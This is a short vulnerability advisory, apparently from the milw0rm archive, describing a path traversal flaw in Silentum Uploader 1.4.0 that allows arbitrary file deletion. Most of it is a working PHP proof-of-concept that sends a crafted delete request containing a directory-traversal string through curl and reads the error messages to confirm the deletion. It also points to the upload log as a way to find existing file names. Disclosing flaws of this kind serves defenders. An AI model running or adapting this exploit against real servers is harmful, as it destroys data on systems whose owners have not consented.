Vendor: http://hypersilence.net
Version(s): Silentum Uploader 1.4.0 (May also affect earlier versions)
Credit: Danny Moules
Critical: Yes

See PUSH 55 Advisory at http://www.push55.co.uk/advisories.php?id=2

----

Due to insufficient validation of client-side data, we can alter the path of files to be deleted to a file outside the intended directory.

The following PoC will delete a file named 'secret.txt' one level above the application folder.

You must have already uploaded a file or you can visit APPLICATIONFOLDER/upload_log.txt (on a default installation) to ascertain the name of existing files.

---

<?php

$strExistingFile = "files/secret.txt"; //Must exist, resides in /files by default
$strToDelete = "\..\..\..\secret.txt"; //Designates 'secret.txt', sat one level above the application folder, for deletion
$strUploadScript = "http://www.example.com/uploader/upload.php";

$objCurl = curl_init();
curl_setopt($objCurl, CURLOPT_URL, $strUploadScript."?delete=".$strExistingFile.$strToDelete);
curl_setopt($objCurl, CURLOPT_RETURNTRANSFER, true);
$strDump = curl_exec($objCurl);
curl_close($objCurl);

if(strpos($strDump, "No such file or directory") !== false)
{
	echo("$strToDelete didn't exist. \n");
}
else if(strpos($strDump, "Permission denied") !== false)
{
	echo("Permission was denied when deleting $strToDelete. \n");
}
else if(strpos($strDump, "function.unlink") !== false)
{
	echo("An unexpected error occured when deleting $strToDelete. \n");
}
else
{
	echo("Looks as though deletion of $strToDelete was successful.\n");
}

?>

# milw0rm.com [2009-01-11]
